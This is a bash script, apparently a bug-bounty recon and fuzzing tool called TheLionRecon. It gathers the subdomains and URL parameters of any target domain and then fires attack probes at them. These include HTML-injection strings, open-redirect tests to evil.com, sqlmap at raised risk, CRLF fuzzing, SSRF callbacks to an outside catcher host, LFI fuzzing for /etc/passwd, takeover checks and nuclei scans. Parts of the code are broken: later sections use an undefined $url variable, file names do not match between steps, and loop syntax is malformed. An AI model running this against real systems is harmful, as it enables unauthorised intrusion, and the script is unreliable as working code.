#! /bin/bash 
target=$1

echo "
 _____ _          _     _             ____                      
|_   _| |__   ___| |   (_) ___  _ __ |  _ \ ___  ___ ___  _ __  
  | | | '_ \ / _ \ |   | |/ _ \| '_ \| |_) / _ \/ __/ _ \| '_ \ 
  | | | | | |  __/ |___| | (_) | | | |  _ <  __/ (_| (_) | | | |
  |_| |_| |_|\___|_____|_|\___/|_| |_|_| \_\___|\___\___/|_| |_|"
echo "        @Abbas Cyber Security"

if [ ! -d "$target" ]; then
      mkdir $target
fi
if [ ! -d "$target/recon" ]; then
      mkdir $target/recon
fi

if [ ! -d "$target/params-vuln" ]; then
          mkdir $target/params-vuln
fi

if [ ! -d "$target/subs-vuln" ]; then
          mkdir $target/subs-vuln
fi

if [ ! -d "$target/recon/false-positive" ]; then
          mkdir $target/recon/false-positive
fi

if [ ! -d "$target/subs-vuln/false-positive" ]; then
          mkdir $target/subs-vuln/false-positive
fi

if [ ! -d "$target/params-vuln/false-positive" ]; then
          mkdir $target/params-vuln/false-positive
fi

if [ ! -d "$target/recon/EyeWitness" ]; then
      mkdir $target/recon/EyeWitness
fi

echo 
""
#---------------------------------------------------------------------------------
#-----------------------------Finding SubDomains----------------------------------
#----------------------------------------------------------------------------------
echo "[+]Enumurating SubDomains Using Amass..." 
amass enum -d $target >> $target/recon/amass.txt
cat $target/recon/amass.txt | grep $target >> $target/recon/final.txt
rm $target/recon/amass.txt

echo "[+]Enumurating SubDomains Using Assetfinder..." 
assetfinder $target >> $target/recon/assetfinder.txt
cat $target/recon/assetfinder.txt | grep $target >> $target/recon/final.txt
rm $target/recon/assetfinder.txt

echo "[+]Enumurating SubDomains Using SubFinder..."
subfinder -d $target -o $target/recon/subfinder.txt
cat $target/recon/subfinder.txt | grep $target >> $target/recon/final.txt
rm $target/recon/subfinder.txt

echo "[+]Enumurating SubDomains Using Findomain..." 
findomain -t $target -q >> $target/recon/findomain.txt
cat $target/recon/findomain.txt | grep $target >> $target/recon/final.txt
rm $target/recon/findomain.txt

echo "[+]Enumurating SubDomains Using Sublist3r..."
python3 /opt/Sublist3r/sublist3r.py -d $target -o $1/recon/sublist3r.txt
cat $target/recon/sublist3r.txt | grep $target >> $target/recon/final.txt
rm $1/recon/sublist3r.txt 

echo "[+]BruteForcing With ffuf..."

echo "[+]BruteForcing With projectsiscovery"

echo "[+]Filtering Repeated Domains........." 
cat $target/recon/final.txt | sort -u | tee $target/recon/final-subs.txt 
rm $target/recon/final.txt 

echo "[+]Total Unique SubDomains" 
cat $target/recon/final-subs.txt | wc -l
#--------------------------------------------------------------------------------------------------
#-----------------------------------Filtering Live SubDomains--------------------------------------
#--------------------------------------------------------------------------------------------------
echo "[+]Removing Dead Domains Using httpx....." 
cat $target/recon/final-subs.txt | httpx --silent  >> $target/recon/live_check.txt

echo "[+]Removing Dead Domains Using httprobe....." 
cat $target/recon/final-subs.txt | httprobe >> $target/recon/live_check.txt

echo "[+]Analyzing Both httpx & httprobe....."
cat $target/recon/live_check.txt | sed 's/https\?:\/\///' | sort -u | tee $target/recon/live-subs.txt 
cat $target/recon/live_check.txt | sort -u | tee $target/recon/false-positive/https-subs.txt
rm $target/recon/live_check.txt

echo "[+]Total Unique Live SubDomains....."
cat $target/recon/live-subs.txt | wc -l

#--------------------------------------------------------------------------------------------------
#----------------------------------------Enumurating Urls-----------------------------------------
#--------------------------------------------------------------------------------------------------
echo "[+]Enumurating Params From Paramspider...." 
python3 /opt/Paramspider/paramspider.py --level high -d $target -p noor -o $1/recon/urls.txt
echo "[+]Enumurating Params From Waybackurls...." 
cat $1/recon/live-subs.txt | waybackurls | grep = | qsreplace lion >> $1/recon/urls.txt
echo "[+]Enumurating Params From gau Tool...." 
gau --subs  $target | grep = | qsreplace lion >> $target/recon/urls.txt 
echo "[+]Enumurating Params From gauPlus Tool...." 
cat $target/recon/live-subs.txt | gauplus | grep = | qsreplace lion >> $1/recon/urls.txt
echo "[+]Enumurating Params Using Katana..."
katana -u $target/recon/live-subs.txt | grep = | qsreplace noor >> $target/recon/urls.txt


echo "[+]Filtering Dups..." 
cat $1/recon/urls.txt | sort -u | tee $1/recon/final-params.txt 
rm $target/recon/urls.txt

echo "[+]Total Unique Params Found..." 
cat $target/recon/final-params.txt | wc -l
#------------------------------------------------------------------------------------------------------------
#--------------------------------------Taking LiveSubs ScreenShots-------------------------------------------
#------------------------------------------------------------------------------------------------------------
#echo "[+]Taking ScreenShots For Live Websites..." 
#python3 /opt/EyeWitness/Python/EyeWitness.py --web -f $url/recon/livesubs.txt --no-prompt -d $1/recon/EyeWitness --resolve --timeout 240
#------------------------------------------------------------------------------------------------------------
#--------------------------------------Scanning For Services Runnings--------------------------------------------
#------------------------------------------------------------------------------------------------------------

#--------------------------------------------------------------------------------------------------
#-------------------------------Checking For Open Ports--------------------------------------------
#--------------------------------------------------------------------------------------------------
#echo "[+] Scanning for open ports..."
#nmap -iL $url/recon/live_subs.txt -T4 -oA $url/recon/openports.txt
#------------------------------------------------------------------------------------------------------------
#--------------------------------------Scanning For WAF -------------------------------------------
#------------------------------------------------------------------------------------------------------------

#------------------------------------------------------------------------------------------------------------
#--------------------------------------Scanning For Whois --------------------------------------------------
#------------------------------------------------------------------------------------------------------------

#------------------------------------------------------------------------------------------------------------
#----------------------------------Searching For Breached Passwords-------------------------------------------
#------------------------------------------------------------------------------------------------------------

#------------------------------------------------------------------------------------------------------------
#--------------------------------------Scanning For Empolyee-Emails -------------------------------------------
#------------------------------------------------------------------------------------------------------------

#------------------------------------------------------------------------------------------------------------
#--------------------------------------Scanning For Breached Data-------------------------------------------
#------------------------------------------------------------------------------------------------------------



echo 
" _____              _               ____                               
|  ___|   _ _______(_)_ __   __ _  |  _ \ __ _ _ __ __ _ _ __ ___  ___ 
| |_ | | | |_  /_  / | '_ \ / _` | | |_) / _` | '__/ _` | '_ ` _ \/ __|
|  _|| |_| |/ / / /| | | | | (_| | |  __/ (_| | | | (_| | | | | | \__ \
|_|   \__,_/___/___|_|_| |_|\__, | |_|   \__,_|_|  \__,_|_| |_| |_|___/
                            |___/                                      
Testing For HTML,XSS,Template,Command,CRLF,SQL Injections And LFI,SSRF,OpenRedirects etc.,
"
#--------------------------------------------------------------------------------------------------
#-------------------------------Fuzzing For HTML Injection-----------------------------------------
#--------------------------------------------------------------------------------------------------
echo "[+]Fuzzing For HTML Injection..." 
cat $target/recon/final-params.txt | qsreplace '"><u>hyper</u>' | tee $target/recon/temp.txt && cat $target/recon/temp.txt | while read host do ; do curl --silent --path-as-is --insecure "$host" | grep -qs "><u>hyper</u>" && echo "$host "; done > $target/params-vuln/htmli.txt
#--------------------------------------------------------------------------------------------------
#-------------------------------Fuzzing For Open Redirects-----------------------------------------
#--------------------------------------------------------------------------------------------------
echo "[+]Fuzzing For Openredirects..." 
cat $target/recon/final-params.txt | qsreplace 'https://evil.com' | while read host do ; do curl -s -L $host -I | grep "https://evil.com" && echo "$host" ; done >> $target/params-vuln/open-redirects.txt
#--------------------------------------------------------------------------------------------------
#-------------------------------Checking For SQL Injection-----------------------------------------
#--------------------------------------------------------------------------------------------------
echo "[+]Testing For SQL Injection...." 
cat $target/recon/final-params.txt | python3 /opt/Sqlmap/sqlmap.py --level 2 --risk 2
#--------------------------------------------------------------------------------------------------
#-------------------------------Checking For Command Injection-----------------------------------------
#--------------------------------------------------------------------------------------------------
#echo "[+]Testing For Command Injection...." 
#python3 /opt/commix/commix.py -m $url/recon/final_params.txt --batch 
#--------------------------------------------------------------------------------------------------
#-------------------------------Checking For CRLF Injection-----------------------------------------
#--------------------------------------------------------------------------------------------------
echo "[+]Testing For CRLF Injection...." 
crlfuzz -l $url/recon/final_params.txt -o $url/crlf_vuln.txt -s 
#--------------------------------------------------------------------------------------------------
#-----------------------------------Checking For SSRF----------------------------------------------
#--------------------------------------------------------------------------------------------------
echo "[+]Testing For External SSRF.........." 
cat $url/recon/final_params.txt | qsreplace "https://noor.requestcatcher.com/test" | tee $url/recon/ssrftest.txt && cat $url/recon/ssrftest.txt | while read host do ; do curl --silent --path-as-is --insecure "$host" | grep -qs "request caught" && echo "$host \033[0;31mVulnearble\n"; done >> $url/eSSRF.txt
rm $url/recon/ssrftest.txt
#--------------------------------------------------------------------------------------------------
#-------------------------------Checking For XXE Injection----------------------------------------
#--------------------------------------------------------------------------------------------------

#--------------------------------------------------------------------------------------------------
#-------------------------------Checking For Local File Inclusion----------------------------------------
#--------------------------------------------------------------------------------------------------
echo "[+]Scanning For Local File Inclusion...."
cat $url/recon/final_params.txt | qsreplace FUZZ | while read host ; do ffuf -u $host -v -mr "root:x" -w payloads/lfi-small.txt ; done > $1/lfi.txt
#--------------------------------------------------------------------------------------------------
#-------------------------Checking For Server Side Template Injection-----------------------------
#--------------------------------------------------------------------------------------------------

echo 
" _____              _               ____                        _           
|  ___|   _ _______(_)_ __   __ _  |  _ \  ___  _ __ ___   __ _(_)_ __  ___ 
| |_ | | | |_  /_  / | '_ \ / _` | | | | |/ _ \| '_ ` _ \ / _` | | '_ \/ __|
|  _|| |_| |/ / / /| | | | | (_| | | |_| | (_) | | | | | | (_| | | | | \__ \
|_|   \__,_/___/___|_|_| |_|\__, | |____/ \___/|_| |_| |_|\__,_|_|_| |_|___/
                            |___/                                           
Fuzzing For SubDomainTakeOvers,BrokenLinks,ClickJacking,CRLF Injection,                             
"
#--------------------------------------------------------------------------------------------------
#-------------------------------Checking For SubDomain TakeOver------------------------------------
#--------------------------------------------------------------------------------------------------
echo "[+]Testing For SubTakeOver" 
subzy --targets  $url/recon/final_subs.txt  --hide_fails >> $url/sub_take_over.txt
#--------------------------------------------------------------------------------------------------
#-------------------------------Fuzzing Domains With Nuclei-----------------------------------------
#--------------------------------------------------------------------------------------------------
echo "[+]Fuzzing Domains With Nuclei..."
cat $url/recon/live_subs.txt | nuclei -t /root/nuclei-templates/ -s critical,high,medium,low >> $1/nuclei.txt
#--------------------------------------------------------------------------------------------------
#-------------------------------------Full Scan With Nikto----------------------------------------
#--------------------------------------------------------------------------------------------------
#echo "[+] Full Scan With Nikto...." 
#nikto -h $url/recon/live_subs.txt > $url/nikto.txt
#--------------------------------------------------------------------------------------------------
#-------------------------------------Fuzzing Domains For Broken Link Hijacking----------------------------------------
#--------------------------------------------------------------------------------------------------

#--------------------------------------------------------------------------------------------------
#-------------------------------------Fuzzing For ClickJacking----------------------------------------
#--------------------------------------------------------------------------------------------------

#--------------------------------------------------------------------------------------------------
#-------------------------------------Fuzzing For Xss in Referer Header------------------------------
#--------------------------------------------------------------------------------------------------

#--------------------------------------------------------------------------------------------------
#-------------------------------------Fuzzing For CRLF Injection----------------------------------------
#--------------------------------------------------------------------------------------------------



